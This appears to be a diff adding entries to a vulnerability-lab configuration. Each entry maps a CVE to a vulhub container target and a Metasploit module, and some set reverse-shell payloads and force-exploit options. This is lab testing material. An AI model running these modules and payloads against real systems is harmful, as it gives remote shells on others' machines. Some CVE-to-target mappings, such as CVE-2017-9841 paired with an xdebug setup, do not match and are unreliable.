@@ -135,5 +135,66 @@
             "target_name":"setc-web-1",
             "exploit": "linux/http/metabase_setup_token_rce"
         }
+    },
+    {"name":"CVE-2020-9496",
+        "settings": {
+            "description":"Apache OFBiz XML-RPC Java Deserialization",
+            "yml_file":"$VULN_PATH/vulhub/ofbiz/CVE-2020-9496/docker-compose.yml",
+            "target_name":"setc-web-1",
+            "exploit": "linux/http/apache_ofbiz_deserialization",
+            "exploit_options": "set payload payload/linux/x86/meterpreter_reverse_tcp; set AutoCheck false;"
+        }
+    },
+    {"name":"CVE-2024-38856",
+        "settings": {
+            "description":"Apache OFBiz forgotPassword/ProgramExport RCE",
+            "yml_file":"$VULN_PATH/vulhub/ofbiz/CVE-2020-9496/docker-compose.yml",
+            "target_name":"setc-web-1",
+            "exploit": "multi/http/apache_ofbiz_forgot_password_directory_traversal",
+            "exploit_options": "set forceexploit true;"
+        }
+    },
+    {"name":"CVE-2023-32315",
+        "settings": {
+            "description":"Openfire authentication bypass with RCE plugin",
+            "yml_file":"$VULN_PATH/vulhub/openfire/CVE-2023-32315/docker-compose.yml",
+            "target_name":"setc-web-1",
+            "exploit": "multi/http/openfire_auth_bypass_rce_cve_2023_32315"
+        }
+    },
+    {"name":"CVE-2020-7247",
+        "settings": {
+            "description":"OpenSMTPD MAIL FROM Remote Code Execution",
+            "yml_file":"$VULN_PATH/vulhub/opensmtpd/CVE-2020-7247/docker-compose.yml",
+            "target_name":"setc-smtpd-1",
+            "exploit": "unix/smtp/opensmtpd_mail_from_rce",
+            "exploit_options": "set payload cmd/unix/reverse_bash;"
+        }
+    },
+    {"name":"CVE-2024-2044",
+        "settings": {
+            "description":"pgAdmin Session Deserialization RCE",
+            "yml_file":"$VULN_PATH/vulhub/pgadmin/CVE-2023-5002/docker-compose.yml",
+            "target_name":"setc-web-1",
+            "exploit": "multi/http/pgadmin_session_deserialization",
+            "exploit_options": "set RPORT 5050; set SSL false; set username vulhub@example.com; set password vulhub;"
+        }
+    },
+    {"name":"CVE-2012-1823",
+        "settings": {
+            "description":"PHP CGI Argument Injection",
+            "yml_file":"$VULN_PATH/vulhub/php/CVE-2012-1823/docker-compose.yml",
+            "target_name":"setc-php-1",
+            "exploit": "multi/http/php_cgi_arg_injection"
+        }
+    },
+    {"name":"CVE-2017-9841",
+        "settings": {
+            "description":"PHP Unauthenticated OS Command Execution",
+            "yml_file":"$VULN_PATH/vulhub/php/xdebug-rce/docker-compose.yml",
+            "target_name":"setc-xdebug2-1",
+            "exploit": "unix/http/xdebug_unauth_exec"
+        }
     }
+
 ]
